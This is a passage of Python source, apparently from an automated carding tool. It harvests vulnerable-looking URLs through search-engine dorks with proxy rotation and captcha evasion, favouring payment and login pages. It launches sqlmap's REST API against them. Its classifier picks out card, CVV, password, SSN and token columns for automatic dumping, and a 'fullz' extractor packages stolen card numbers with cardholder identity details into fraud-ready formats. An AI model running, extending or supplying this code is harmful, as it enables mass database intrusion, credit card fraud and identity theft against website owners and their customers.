    "agoda.com","vrbo.com","paypal.com","stripe.com","square.com","bankofamerica.com",
    "chase.com","wellsfargo.com","citibank.com","americanexpress.com","capitalone.com",
    "discover.com","usbank.com","tdbank.com","truist.com","creditkarma.com","nerdwallet.com",
    "mint.com","experian.com","equifax.com","transunion.com","intuit.com","turbotax.intuit.com",
    "irs.gov","usa.gov","gov.uk","data.gov","studentaid.gov","ed.gov","ohio.gov",
    "netflix.com","hulu.com","disneyplus.com","hbomax.com","spotify.com","soundcloud.com",
    "poki.com","roblox.com","steam.com","steampowered.com","epicgames.com","ea.com",
    "bbc.com","bbc.co.uk","cnn.com","nytimes.com","theguardian.com","reuters.com",
    "apnews.com","forbes.com","businessinsider.com","techcrunch.com","github.com",
    "gitlab.com","stackoverflow.com","stackexchange.com","medium.com","dev.to",
    "npm.js.org","pypi.org","docs.python.org","notion.so","airtable.com","slack.com",
    "zoom.us","grammarly.com","canva.com","figma.com","dropbox.com","box.com",
    "zillow.com","realtor.com","redfin.com","apartments.com","trulia.com","craigslist.org",
    "yelp.com","angi.com","homedepot.com","lowes.com","staples.com","officedepot.com",
    "adobe.com","salesforce.com","hubspot.com","zendesk.com","xe.com","transferwise.com",
    "wise.com","kiplinger.com","thecollegeinvestor.com","wallethub.com",
    "merriam-webster.com","dictionary.com","cambridge.org","scheels.com",
    "dickssportinggoods.com","rei.com",
}

JUNK_EXT = re.compile(r"\.(css|js|png|jpg|jpeg|gif|ico|svg|webp|woff|woff2|ttf|eot|xml|json|zip|exe|dmg|apk|pdf|doc|docx|xls|xlsx|csv|mp4|mp3|avi|mov|mkv|flv|swf|iso|tar|gz|rar|7z)(\?|$)", re.I)
JUNK_URL_PATTERNS = re.compile(r"(doubleclick|adservice|pagead|adsense|googletagmanager|/redir\?|/redirect\?|/click\?|/trk\?|/track\?|/affiliate/|/aff/|/banner/|/pixel/|/beacon/|/ads/|ad\.php|/ad/\d)", re.I)
HIGH_VALUE = re.compile(r"(payment|checkout|billing|invoice|transaction|receipt|order|cart|subscribe|subscription|membership|upgrade|refund|gateway|paypal|stripe|razorpay|authorize|braintree|login|signin|account|dashboard|profile|admin|member|creditcard|credit.card|debit|cardinfo|buy|purchase|shop|plan|register|signup)", re.I)

def clean_dork_for_search(dork: str) -> str:
    d = dork.replace("\\", " ")
    d = re.sub(r'\bsite:\.?[a-zA-Z]{2}\b(?![\w.])', ' ', d)
    d = re.sub(r"\|\.\s*>", " ", d)
    d = re.sub(r"\d\s*\|\s*\d\s*\|\s*\d", " ", d)
    d = d.replace("|", " ").replace("~", "")
    d = re.sub(r"-intext:\S+", "", d)
    d = d.replace(" & ", " ")
    d = re.sub(r"\*(\w+)", r"\1", d)
    d = re.sub(r"\bor\s+\w+\s*$", "", d, flags=re.I)
    return re.sub(r"\s+", " ", d).strip()

_STRIP_PARAMS = frozenset([
    "utm_source","utm_medium","utm_campaign","utm_content","utm_term","utm_id",
    "utm_source_platform","utm_creative_format","utm_marketing_tactic",
    "fbclid","gclid","msclkid","twclid","ttclid","li_fat_id","wbraid",
    "gbraid","dclid","yclid","zanpid","clickid","click_id",
    "msockid","wa","whr","JitExp","mkt","WT.mc_id","WT.srch",
    "__hssc","__hstc","__hsrc","hsctaTracking","hsa_acc","hsa_cam",
    "hsa_grp","hsa_ad","hsa_src","hsa_tgt","hsa_kw","hsa_mt",
    "hsa_net","hsa_ver","mc_cid","mc_eid","vero_id","mkt_tok",
    "ref","referrer","referer","source","share","sid","cid",
    "affiliate","partner","origin","campaign","adid","ad_id",
    "placement","network","device","keyword","matchtype",
    "_ga","_gid","_gl","_gac","ga_source",
    "execution","feedViewType","noredirect","RTN","icid","linkId","adobe_mc",
    "s_kwcid","ef_id",
])

def normalize_url(url: str) -> str:
    try:
        url = url.rstrip("/").strip()
        p = urlparse(url)
        netloc = p.netloc.lower()
        if p.query:
            clean = [(k,v) for k,v in parse_qsl(p.query, keep_blank_values=True) if k.lower() not in _STRIP_PARAMS]
            q = urlencode(sorted(clean)) if clean else ""
        else:
            q = ""
        return f"{p.scheme.lower()}://{netloc}{p.path}" + (f"?{q}" if q else "")
    except Exception:
        return url

def is_valid_url(url: str) -> bool:
    try:
        p = urlparse(url)
        if p.scheme not in ("http","https"): return False
        domain = p.netloc.lower().split(":")[0]
        if domain.startswith("www."): domain = domain[4:]
        if not domain or "." not in domain or len(domain) < 4: return False
        for bl in BLACKLIST_DOMAINS:
            if domain == bl or domain.endswith("." + bl): return False
        if not p.path or p.path in ("/",""): return False
        if JUNK_EXT.search(p.path): return False
        if JUNK_URL_PATTERNS.search(url): return False
        return True
    except Exception:
        return False

def url_quality_score(url: str) -> int:
    score = 0
    try:
        p = urlparse(url.lower())
        path, query = p.path, p.query
        if query:
            score += 3
            score += min(len(parse_qs(query)), 3)
        if ".php" in path:
            score += 3
            if query: score += 3
        elif ".aspx" in path or ".asp" in path:
            score += 2
            if query: score += 2
        elif ".cfm" in path or ".jsp" in path:
            score += 1
            if query: score += 1
        if HIGH_VALUE.search(path): score += 4
        if p.scheme == "https": score += 1
    except Exception: pass
    return score

def _parse_proxy(proxy_str: str) -> str:
    if not proxy_str: return ""
    proxy_str = proxy_str.strip().rstrip("\r")
    if proxy_str.startswith(("http://","https://","socks5://","socks4://")):
        return proxy_str
    parts = proxy_str.split(":")
    if len(parts) == 4:
        h,p,u,pw = parts
        return f"http://{u}:{pw}@{h}:{p}"
    if len(parts) == 2:
        return f"socks5://{proxy_str}"
    return f"socks5://{proxy_str}"

async def check_proxy_live(proxy_url: str, timeout: float = 8.0) -> bool:
    if not proxy_url: return False
    is_socks = proxy_url.startswith(("socks5://","socks4://"))
    try:
        if is_socks and _SOCKS_AVAILABLE:
            connector = _ProxyConnector.from_url(proxy_url, ssl=False)
        else:
            connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as s:
            kw = dict(timeout=aiohttp.ClientTimeout(total=timeout), allow_redirects=False)
            if not is_socks: kw["proxy"] = proxy_url
            async with s.get("https://api.ipify.org", **kw) as r:
                return r.status in (200,301,302)
    except Exception:
        return False

async def check_proxies_bulk(proxy_list, timeout=6.0, concurrency=300, progress_callback=None):
    total = len(proxy_list); live = []; checked = 0; last_report = 0.0
    sem = asyncio.Semaphore(concurrency)
    async def _check(px):
        nonlocal checked, last_report, live
        async with sem:
            if await check_proxy_live(px, timeout=timeout):
                live.append(px)
            checked += 1
            now = asyncio.get_event_loop().time()
            if progress_callback and (now - last_report) >= 2.0:
                last_report = now
                try: await progress_callback(checked, total, len(live))
                except Exception: pass
    await asyncio.gather(*[_check(p) for p in proxy_list], return_exceptions=True)
    if progress_callback:
        try: await progress_callback(checked, total, len(live))
        except Exception: pass
    return live

def _pick_proxy(pool: list) -> str:
    return random.choice(pool) if pool else ""

_CAPTCHA_PHRASES = ("captcha","unusual traffic","access denied","robot check",
    "verify you are human","enable javascript","checking your browser",
    "just a moment","ddos protection","please wait","security check","bot traffic")

def _is_captcha_page(html: str) -> bool:
    sample = html[:3000].lower()
    return any(p in sample for p in _CAPTCHA_PHRASES)

def _ddgs_search_sync(dork: str, max_results: int, proxy_list=None):
    if proxy_list is None: proxy_list = []
    if not DDGS_AVAILABLE: return []
    cleaned = clean_dork_for_search(dork)
    if not cleaned: return []
    _ddgs_wait_if_coolingdown()
    for attempt in range(3):
        proxy_url = _pick_proxy(proxy_list)
        try:
            if proxy_url:
                try: ddgs_obj = DDGS(proxy=proxy_url)
                except TypeError:
                    try: ddgs_obj = DDGS(proxies=proxy_url)
                    except Exception: ddgs_obj = DDGS()
            else:
                ddgs_obj = DDGS()
            results = ddgs_obj.text(cleaned, max_results=max_results, safesearch="off")
            urls = []
            for r in (results or []):
                h = r.get("href","")
                if h and h.startswith("http") and is_valid_url(h):
                    urls.append(h.rstrip("/"))
            if urls:
                _ddgs_record_success()
                return urls
            _ddgs_record_empty()
            time.sleep(0.5 * (attempt + 1))
            _ddgs_wait_if_coolingdown()
        except Exception as ex:
            msg = str(ex).lower()
            if any(k in msg for k in ("ratelimit","202","timeout")):
                _ddgs_record_empty()
                time.sleep(1.5 * (attempt + 1))
                _ddgs_wait_if_coolingdown()
            elif attempt < 2:
                time.sleep(0.3)
    _ddgs_record_empty()
    return []

def _ddgs_expand_dork(dork: str, num_variants: int = 3) -> list:
    base = dork.strip()
    has_real_site = bool(re.search(r'site:[a-zA-Z0-9][a-zA-Z0-9.-]{3,}', base))
    if num_variants <= 1 or has_real_site:
        return [base]
    v = [base, base + " site:.com"]
    if num_variants >= 3: v.append(base + " site:.org")
    return v

async def search_ddgs_batch(dorks, max_results=12, proxy_list=None, num_variants=3):
    if proxy_list is None: proxy_list = []
    if not DDGS_AVAILABLE: return []
    expanded = []
    for d in dorks: expanded.extend(_ddgs_expand_dork(d, num_variants=num_variants))
    loop = asyncio.get_running_loop()
    all_urls = []
    SUB_BATCH = 20
    for i in range(0, len(expanded), SUB_BATCH):
        sub = expanded[i:i+SUB_BATCH]
        futures = [loop.run_in_executor(_THREAD_POOL, _ddgs_search_sync, d, max_results, proxy_list) for d in sub]
        results = await asyncio.gather(*futures, return_exceptions=True)
        for r in results:
            if isinstance(r, list): all_urls.extend(r)
        if i + SUB_BATCH < len(expanded):
            await asyncio.sleep(0.2)
    return all_urls

def decode_bing_redirect(href: str) -> str:
    try:
        if "bing.com/ck/a" in href or "/ck/a?" in href:
            full = href if href.startswith("http") else "https://www.bing.com" + href
            parsed = urlparse(full); params = parse_qs(parsed.query)
            if "u" in params:
                u_val = params["u"][0]
                if u_val.startswith("a1"): u_val = u_val[2:]
                rem = len(u_val) % 4
                if rem: u_val += "=" * (4 - rem)
                decoded = base64.b64decode(u_val).decode("utf-8", errors="ignore")
                if decoded.startswith("http"): return decoded
    except Exception: pass
    return href

def _fix_href(href, skip_domain=""):
    if not href: return ""
    if "bing.com/ck/a" in href or "/ck/a?" in href: href = decode_bing_redirect(href)
    if "uddg=" in href:
        try: href = unquote(href.split("uddg=")[1].split("&")[0])
        except Exception: pass
    if "/RU=" in href:
        try: href = unquote(href.split("/RU=")[1].split("/RK=")[0])
        except Exception: pass
    if skip_domain and skip_domain in href.lower(): return ""
    return href

def extract_bing_urls(html: str) -> list:
    urls = []
    try:
        soup = BeautifulSoup(html, "lxml")
        for li in soup.find_all("li", class_="b_algo"):
            for a in li.find_all("a", href=True):
                h = _fix_href(a["href"].strip(), "bing.com")
                if h.startswith("http") and is_valid_url(h): urls.append(h.rstrip("/"))
        for h2 in soup.find_all("h2"):
            a = h2.find("a", href=True)
            if a:
                h = _fix_href(a["href"].strip(), "bing.com")
                if h.startswith("http") and is_valid_url(h): urls.append(h.rstrip("/"))
        if not urls:
            for a in soup.find_all("a", href=True):
                h = _fix_href(a["href"].strip(), "bing.com")
                if h.startswith("http") and is_valid_url(h): urls.append(h.rstrip("/"))
    except Exception: pass
    return list(dict.fromkeys(urls))

def extract_ddg_urls(html: str) -> list:
    urls = []
    try:
        soup = BeautifulSoup(html, "lxml")
        for a in soup.find_all("a", href=True):
            h = _fix_href(a["href"].strip(), "duckduckgo.com")
            if h.startswith("http") and is_valid_url(h): urls.append(h.rstrip("/"))
    except Exception: pass
    return list(dict.fromkeys(urls))

def extract_yandex_urls(html: str) -> list:
    urls = []
    try:
        soup = BeautifulSoup(html, "lxml")
        for a in soup.find_all("a", {"class": lambda c: c and "organic__url" in c}):
            h = _fix_href(a.get("href","").strip(), "yandex.com")
            if h.startswith("http") and is_valid_url(h): urls.append(h.rstrip("/"))
        for tag in soup.find_all(attrs={"data-url": True}):
            h = _fix_href(tag["data-url"].strip(), "yandex.com")
            if h.startswith("http") and is_valid_url(h): urls.append(h.rstrip("/"))
        if not urls:
            for a in soup.find_all("a", href=True):
                h = _fix_href(a["href"].strip(), "yandex.com")
                if h.startswith("http") and is_valid_url(h): urls.append(h.rstrip("/"))
    except Exception: pass
    return list(dict.fromkeys(urls))

def extract_ask_urls(html: str) -> list:
    urls = []
    try:
        soup = BeautifulSoup(html, "lxml")
        for a in soup.find_all("a", href=True):
            h = _fix_href(a["href"].strip(), "ask.com")
            if h.startswith("http") and is_valid_url(h): urls.append(h.rstrip("/"))
    except Exception: pass
    return list(dict.fromkeys(urls))

def extract_google_urls(html: str) -> list:
    urls = []
    try:
        soup = BeautifulSoup(html, "lxml")
        for div in soup.find_all("div", class_="yuRUbf"):
            a = div.find("a", href=True)
            if a:
                h = _fix_href(a["href"].strip(), "google.com")
                if h.startswith("http") and is_valid_url(h): urls.append(h.rstrip("/"))
        if not urls:
            for h3 in soup.find_all("h3"):
                a = h3.find_parent("a", href=True)
                if a:
                    h = _fix_href(a["href"].strip(), "google.com")
                    if h.startswith("http") and is_valid_url(h): urls.append(h.rstrip("/"))
    except Exception: pass
    return list(dict.fromkeys(urls))

def extract_brave_urls(html: str) -> list:
    urls = []
    try:
        soup = BeautifulSoup(html, "lxml")
        for a in soup.find_all("a", href=True):
            h = _fix_href(a["href"].strip(), "brave.com")
            if h.startswith("http") and is_valid_url(h): urls.append(h.rstrip("/"))
    except Exception: pass
    return list(dict.fromkeys(urls))

def extract_mojeek_urls(html: str) -> list:
    urls = []
    try:
        soup = BeautifulSoup(html, "lxml")
        for li in soup.find_all("li", class_=re.compile(r"result")):
            a = li.find("a", href=True)
            if a:
                h = _fix_href(a["href"].strip(), "mojeek.com")
                if h.startswith("http") and is_valid_url(h): urls.append(h.rstrip("/"))
        if not urls:
            for a in soup.find_all("a", href=True):
                h = _fix_href(a["href"].strip(), "mojeek.com")
                if h.startswith("http") and is_valid_url(h): urls.append(h.rstrip("/"))
    except Exception: pass
    return list(dict.fromkeys(urls))

SCRAPE_ENGINES = [
    {"name": "bing",
     "url": "https://www.bing.com/search?q={query}&first={offset}&count=30&setmkt=en-US&setlang=en",
     "extractor": extract_bing_urls,
     "offsets": [1,11,21,31,41,51,61,71,81,91],
     "referer": "https://www.bing.com/", "weight": 5},
    {"name": "google",
     "url": "https://www.google.com/search?q={query}&start={offset}&num=20&hl=en",
     "extractor": extract_google_urls,
     "offsets": [0,10,20,30,40,50],
     "referer": "https://www.google.com/", "weight": 3},
    {"name": "brave",
     "url": "https://search.brave.com/search?q={query}&offset={offset}&source=web",
     "extractor": extract_brave_urls,
     "offsets": [0,10,20,30],
     "referer": "https://search.brave.com/", "weight": 2},
    {"name": "ddg_lite",
     "url": "https://lite.duckduckgo.com/lite/?q={query}&s={offset}",
     "extractor": extract_ddg_urls,
     "offsets": [0,20,40,60],
     "referer": "https://lite.duckduckgo.com/", "weight": 2},
    {"name": "ddg_html",
     "url": "https://html.duckduckgo.com/html/?q={query}&s={offset}",
     "extractor": extract_ddg_urls,
     "offsets": [0,30,60,90],
     "referer": "https://html.duckduckgo.com/", "weight": 2},
    {"name": "yandex",
     "url": "https://yandex.com/search/?text={query}&p={offset}",
     "extractor": extract_yandex_urls,
     "offsets": [0,1,2,3],
     "referer": "https://yandex.com/", "weight": 1},
    {"name": "mojeek",
     "url": "https://www.mojeek.com/search?q={query}&s={offset}",
     "extractor": extract_mojeek_urls,
     "offsets": [1,11,21,31],
     "referer": "https://www.mojeek.com/", "weight": 1},
    {"name": "ask",
     "url": "https://www.ask.com/web?q={query}&o={offset}",
     "extractor": extract_ask_urls,
     "offsets": [1,11,21,31],
     "referer": "https://www.ask.com/", "weight": 1},
]
_ENGINE_POOL = [e for e in SCRAPE_ENGINES for _ in range(e.get("weight", 1))]

async def fetch_scrape(session, engine, dork, offset, semaphore, proxy_list=None):
    if proxy_list is None: proxy_list = []
    cleaned = clean_dork_for_search(dork)
    url = engine["url"].format(query=quote_plus(cleaned), offset=offset)
    headers = random.choice(HEADERS_LIST).copy()
    headers["Referer"] = engine.get("referer", "https://www.bing.com/")
    async with semaphore:
        for attempt in range(2):
            try:
                proxy_url = _pick_proxy(proxy_list)
                is_socks = proxy_url.startswith(("socks5://","socks4://")) if proxy_url else False
                if is_socks and _SOCKS_AVAILABLE:
                    conn = _ProxyConnector.from_url(proxy_url, ssl=False)
                    async with aiohttp.ClientSession(connector=conn) as s:
                        async with s.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=8), allow_redirects=True) as r:
                            if r.status == 200:
                                html = await r.text(errors="ignore")
                                if len(html) > 500 and not _is_captcha_page(html):
                                    return engine["extractor"](html)
                    return []
                kw = dict(headers=headers, timeout=aiohttp.ClientTimeout(total=8), ssl=False, allow_redirects=True)
                if proxy_url and not is_socks: kw["proxy"] = proxy_url
                async with session.get(url, **kw) as r:
                    if r.status == 200:
                        html = await r.text(errors="ignore")
                        if len(html) > 500 and not _is_captcha_page(html):
                            return engine["extractor"](html)
                        await asyncio.sleep(0.1 * (attempt + 1)); continue
                    elif r.status in (429,403,202):
                        await asyncio.sleep(0.5 * (attempt + 1)); continue
                    return []
            except asyncio.TimeoutError: pass
            except Exception:
                if attempt == 0: await asyncio.sleep(0.05)
        return []

async def search_urls_from_dorks(dorks, limit=100_000, progress_callback=None, stop_event=None, proxy_list=None):
    if proxy_list is None: proxy_list = []
    found = {}; seen = set(); domains = {}
    total = len(dorks); retries = 0
    last_progress = 0.0
    MAX_PER_DOMAIN = 8
    num_variants = 3 if total <= 500 else (2 if total <= 5000 else 1)
    random.shuffle(dorks)

    def _add(url):
        if len(found) >= limit: return
        if not is_valid_url(url): return
        n = normalize_url(url)
        if n in seen: return
        try:
            d = urlparse(url).netloc.lower().lstrip("www.")
            if domains.get(d, 0) >= MAX_PER_DOMAIN: return
            domains[d] = domains.get(d, 0) + 1
        except Exception: pass
        seen.add(n)
        found[url.rstrip("/")] = url_quality_score(url)

    async def _report(done):
        nonlocal last_progress
        now = time.monotonic()
        if now - last_progress < 1.5: return
        last_progress = now
        if progress_callback:
            try: await progress_callback(done, total, len(found), retries)
            except Exception: pass

    connector = _get_connector()
    scrape_sem = asyncio.Semaphore(80)
    batch_gate = asyncio.Semaphore(15)

    async def _process_batch(start, batch):
        nonlocal retries
        async with batch_gate:
            if (stop_event and stop_event.is_set()) or len(found) >= limit: return
            bing = SCRAPE_ENGINES[0]
            tasks = []
            for d in batch:
                for off in bing["offsets"][:7]:
                    tasks.append(fetch_scrape(session, bing, d, off, scrape_sem, proxy_list))
                sec = random.choice(_ENGINE_POOL)
                tasks.append(fetch_scrape(session, sec, d, random.choice(sec["offsets"]), scrape_sem, proxy_list))
            ga = [asyncio.gather(*tasks, return_exceptions=True)]
            if DDGS_AVAILABLE:
                ga.append(asyncio.wait_for(search_ddgs_batch(batch, 100, proxy_list, num_variants), timeout=45.0))
            res = await asyncio.gather(*ga, return_exceptions=True)
            scrape_res = res[0]
            if isinstance(scrape_res, list):
                for r in scrape_res:
                    if isinstance(r, list):
                        for u in r: _add(u)
                    elif isinstance(r, Exception): retries += 1
            if len(res) > 1:
                ddgs_res = res[1]
                if isinstance(ddgs_res, list):
                    for u in ddgs_res: _add(u)
                elif isinstance(ddgs_res, (asyncio.TimeoutError, Exception)): retries += len(batch)
            await _report(min(start + len(batch), total))

    async with aiohttp.ClientSession(connector=connector, connector_owner=False) as session:
        BATCH = 35; GROUP_SIZE = 90
        starts = list(range(0, total, BATCH))
        for gs in range(0, len(starts), GROUP_SIZE):
            g = starts[gs:gs+GROUP_SIZE]
            await asyncio.gather(*[_process_batch(i, dorks[i:i+BATCH]) for i in g], return_exceptions=True)
            if (stop_event and stop_event.is_set()) or len(found) >= limit: break
    return list(dict.fromkeys(u for u, _ in sorted(found.items(), key=lambda x: x[1], reverse=True)))

# ═══════════════════════════════════════════════════════════════════════════
#  🚀  SQLMAP REST API
# ═══════════════════════════════════════════════════════════════════════════
async def _check_server() -> bool:
    try:
        async with aiohttp.ClientSession(timeout=API_TIMEOUT) as sess:
            async with sess.get(f"{API_BASE}/version") as r:
                return r.status == 200
    except Exception:
        return False

async def ensure_api_server() -> bool:
    global _server_proc, _server_ready
    async with _server_lock:
        if _server_ready and await _check_server(): return True
        if await _check_server(): _server_ready = True; return True
        if not SQLMAPAPI_BIN:
            logger.error("sqlmapapi not found — REST API unavailable")
            return False
        launch_cmd = SQLMAPAPI_BIN.split() + ["-s", "-H", API_HOST, "-p", str(API_PORT)]
        try:
            _server_proc = subprocess.Popen(launch_cmd,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                env={**os.environ, "PYTHONUNBUFFERED": "1"})
        except Exception as e:
            logger.error(f"sqlmapapi start failed: {e}"); return False
        for _ in range(20):
            await asyncio.sleep(1)
            if await _check_server():
                _server_ready = True
                logger.info(f"sqlmapapi ready @ {API_BASE}"); return True
        return False

def stop_api_server():
    global _server_proc, _server_ready
    if _server_proc:
        try: _server_proc.terminate()
        except Exception: pass
        _server_proc = None
    _server_ready = False

async def _api_get(session, path):
    async with session.get(f"{API_BASE}{path}", timeout=API_TIMEOUT) as r:
        return await r.json()

async def _api_post(session, path, data):
    async with session.post(f"{API_BASE}{path}", json=data, timeout=API_TIMEOUT) as r:
        return await r.json()

# ═══════════════════════════════════════════════════════════════════════════
#  🚀  DOCTOR SQL — SEVERITY CLASSIFIER
# ═══════════════════════════════════════════════════════════════════════════
SEVERITY_CRITICAL = "🔴 CRITICAL"
SEVERITY_HIGH     = "🟠 HIGH"
SEVERITY_MEDIUM   = "🟡 MEDIUM"
SEVERITY_LOW      = "🟢 LOW"
SEVERITY_INFO     = "⚪ INFO"

SENSITIVE_KEYWORDS = {
    "credit_card": ["card_number","cardnumber","card_num","cc_number","ccnumber",
                    "credit_card","creditcard","card","cc","pan","card_data",
                    "card_info","payment_card","debit_card","card_no"],
    "cvv": ["cvv","cvc","cvv2","cvc2","security_code","card_code",
            "verification_code","cvn"],
    "expiry": ["expiry","expiry_date","exp_date","expiration","card_expiry",
               "card_exp","expiry_month","expiry_year","exp_month","exp_year"],
    "password": ["password","passwd","pwd","pass","password_hash","hash",
                 "encrypted_password","hashed_password","user_pass","pass_hash",
                 "password_md5","password_sha","user_password","account_password"],
    "email": ["email","email_address","mail","user_email","member_email",
              "account_email","contact_email","primary_email"],
    "username": ["username","user_name","login","userid","user_id","login_name",
                 "account_name","member_name","handle","nickname"],
    "ssn": ["ssn","social_security","social_security_number","sin",
            "national_id","national_number","id_number","personal_id"],
    "phone": ["phone","phone_number","mobile","mobile_number","cell",
              "telephone","tel","contact_number","phone_no"],
    "address": ["address","billing_address","shipping_address","street",
                "street_address","home_address"],
    "token": ["token","auth_token","access_token","refresh_token",
              "api_key","secret_key","private_key","session_token"],
}

AUTO_DUMP_PAIRS = [
    ("email","password","email:pass"), ("email","passwd","email:pass"),
    ("username","password","user:pass"), ("user","password","user:pass"),
    ("login","password","login:pass"), ("login","passwd","login:pass"),
    ("username","passwd","user:pass"), ("user","pass","user:pass"),
    ("email","pwd","email:pwd"), ("username","pwd","user:pwd"),
    ("card_number","cvv","card:cvv"), ("cc","cvv","cc:cvv"),
    ("username","token","user:token"), ("email","token","email:token"),
]

def keyword_match_columns(tables: list) -> dict:
    matches = {cat: [] for cat in SENSITIVE_KEYWORDS}
    for tbl in tables:
        tname = tbl.get("table","") if isinstance(tbl, dict) else str(tbl)
        cols = tbl.get("columns", []) if isinstance(tbl, dict) else []
        for col in cols:
            cl = str(col).lower()
            for cat, kws in SENSITIVE_KEYWORDS.items():
                for kw in kws:
                    if kw in cl:
                        matches[cat].append((tname, col)); break
    return {k: v for k, v in matches.items() if v}

def detect_auto_pairs(tables: list) -> list:
    out = []
    for tbl in tables:
        tname = tbl.get("table","") if isinstance(tbl, dict) else str(tbl)
        cols = [str(c).lower() for c in (tbl.get("columns", []) if isinstance(tbl, dict) else [])]
        for kw1, kw2, pname in AUTO_DUMP_PAIRS:
            if any(kw1 in c for c in cols) and any(kw2 in c for c in cols):
                c1 = next((c for c in cols if kw1 in c), kw1)
                c2 = next((c for c in cols if kw2 in c), kw2)
                out.append((tname, c1, c2, pname))
    return out

def classify_severity(keyword_matches: dict, cards: list) -> str:
    cats = set(keyword_matches.keys())
    if cards: return SEVERITY_CRITICAL
    if "credit_card" in cats and ("cvv" in cats or "expiry" in cats): return SEVERITY_CRITICAL
    if "credit_card" in cats: return SEVERITY_HIGH
    if "ssn" in cats: return SEVERITY_HIGH
    if "token" in cats and ("email" in cats or "username" in cats): return SEVERITY_HIGH
    if "email" in cats and "password" in cats: return SEVERITY_HIGH
    if "username" in cats and "password" in cats: return SEVERITY_HIGH
    if "email" in cats or "password" in cats or "username" in cats: return SEVERITY_MEDIUM
    if "phone" in cats or "address" in cats: return SEVERITY_LOW
    return SEVERITY_INFO

_CARD_RE = re.compile(
    r"\b(4[0-9]{12}(?:[0-9]{3,6})?|5[1-5][0-9]{14}"
    r"|2(?:2[2-9][1-9]|[3-6]\d{2}|7(?:[01]\d|20))\d{12}"
    r"|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12}"
    r"|(?:2131|1800|35\d{3})\d{11})\b"
)
_EXP_RE = re.compile(r"\b(0?[1-9]|1[0-2])[/\-|,](2[0-9]|20[0-9]{2})\b")
_CVV_RE = re.compile(r"\b([0-9]{3,4})\b")

def _extract_cards_from_text(text: str) -> list:
    cards, seen = [], set()
    for m in _CARD_RE.finditer(text):
        cn = m.group(1)
        ctx = text[max(0, m.start()-60):m.start()+120]
        em = _EXP_RE.search(ctx)
        if em:
            month = em.group(1).zfill(2); year = em.group(2)
            if len(year) == 4: year = year[2:]
        else:
            month, year = "??", "??"
        cvv = "???"
        t3, t4 = cn[-3:], cn[-4:]
        for c in _CVV_RE.findall(text[m.end():m.end()+80]):
            if c == year or c == ("20"+year): continue
            if c == t3 or c == t4: continue
            if len(c) in (3,4): cvv = c; break
        entry = f"{cn}|{month}|{year}|{cvv}"
        if entry not in seen: seen.add(entry); cards.append(entry)
    return cards

def _extract_cards_from_api_data(data_list: list) -> list:
    cards, seen = [], set()
    for item in data_list:
        val = item.get("value","")
        text = json.dumps(val) if not isinstance(val, str) else val
        for c in _extract_cards_from_text(text):
            if c not in seen: seen.add(c); cards.append(c)
    return cards






# ═══════════════════════════════════════════════════════════════════════════
#  💳  FULLZ EXTRACTOR — CC + Cardholder data
# ═══════════════════════════════════════════════════════════════════════════

FULLZ_FIELD_ALIASES = {
    "cc_number":  ["card_number","cardnumber","card_num","cc_number","ccnumber",
                   "credit_card","creditcard","card_no","card","cc","pan"],
    "cvv":        ["cvv","cvc","cvv2","cvc2","security_code","card_code","verification_code","cvn"],
    "exp_month":  ["exp_month","expiry_month","expm","card_exp_month","expiration_month","month"],
    "exp_year":   ["exp_year","expiry_year","expy","card_exp_year","expiration_year","year"],
    "exp_full":   ["expiry","expiry_date","exp_date","expiration","card_expiry","card_exp"],
    "holder_name":["cardholder","card_holder","name_on_card","holder_name","full_name",
                   "first_name","fname","customer_name","account_holder","card_name"],
    "last_name":  ["last_name","lname","surname","family_name","lastname"],
    "address":    ["billing_address","address","address1","address_1","street","street_address",
                   "home_address","addr","addr1","addressline","address_line_1"],
    "address2":   ["address2","address_2","addr2","addressline2","address_line_2"],
    "city":       ["city","town","billing_city","city_name","locality"],
    "state":      ["state","province","region","billing_state","state_name"],
    "zip":        ["zip","zip_code","zipcode","postal","postal_code","postcode","billing_zip",
                   "billing_postal_code"],
    "country":    ["country","country_code","billing_country","nation","iso_country"],
    "phone":      ["phone","phone_number","mobile","mobile_number","cell","telephone",
                   "tel","contact_number","phone_no","billing_phone","cellphone"],
    "email":      ["email","email_address","mail","user_email","member_email","account_email",
                   "contact_email","primary_email","billing_email"],
    "dob":        ["dob","birthdate","birth_date","date_of_birth","birthday"],
    "ssn":        ["ssn","social_security","social_security_number","sin","national_id","tax_id"],
    "user_id":    ["user_id","userid","customer_id","customerid","member_id","account_id",
                   "client_id","uid","profile_id","account_number"],
}

def _normalize_col(col: str) -> str:
    return re.sub(r"[^a-z0-9_]", "", str(col).lower())

def _match_field(column_name: str) -> str:
    cn = _normalize_col(column_name)
    for field, aliases in FULLZ_FIELD_ALIASES.items():
        if cn in aliases:
            return field
    for field, aliases in FULLZ_FIELD_ALIASES.items():
        for alias in aliases:
            if alias in cn or cn in alias:
                return field
    return ""

class FullzRecord:
    __slots__ = ("cc_number","cvv","exp_month","exp_year","holder_name",
                 "address","address2","city","state","zip","country",
                 "phone","email","dob","ssn","user_id","source_table","raw_row")
    def __init__(self):
        for s in self.__slots__: setattr(self, s, "")

    def to_cc_format(self) -> str:
        if not self.cc_number: return ""
        return f"{self.cc_number}|{self.exp_month or '??'}|{self.exp_year or '??'}|{self.cvv or '???'}"

    def to_fullz_format(self) -> str:
        return "|".join([
            self.cc_number or "?", self.exp_month or "??", self.exp_year or "??",
            self.cvv or "???", self.holder_name or "?", self.address or "?",
            self.address2 or "-", self.city or "?", self.state or "?", self.zip or "?",
            self.country or "?", self.phone or "?", self.email or "?",
            self.dob or "-", self.ssn or "-",
        ])

    def is_complete(self) -> bool:
        return bool(self.cc_number and (self.holder_name or self.address) and self.zip)

    def has_card(self) -> bool:
        return bool(self.cc_number)

def _row_to_dict(header_row, data_row) -> dict:
    out = {}
    for i, col in enumerate(header_row):
        if i < len(data_row):
            out[col] = str(data_row[i]).strip()
    return out

def _detect_header(row) -> bool:
    if not row: return False
    text = " ".join(str(c).lower() for c in row)
    header_hints = ["id","name","email","card","address","phone","password","user",
                    "date","zip","city","amount","order","product","price","status"]
    hits = sum(1 for h in header_hints if h in text)
    return hits >= 3 and not _CARD_RE.search(text)

def _parse_fullz_row(row_dict: dict, source_table: str = "") -> FullzRecord:
    rec = FullzRecord()
    rec.source_table = source_table
    rec.raw_row = "|".join(f"{k}={v}" for k, v in row_dict.items())
    for col, val in row_dict.items():
        field = _match_field(col)
        if not field or not val or val.lower() in ("null","none","","n/a","na"):
            continue
        if not getattr(rec, field):
            setattr(rec, field, val)
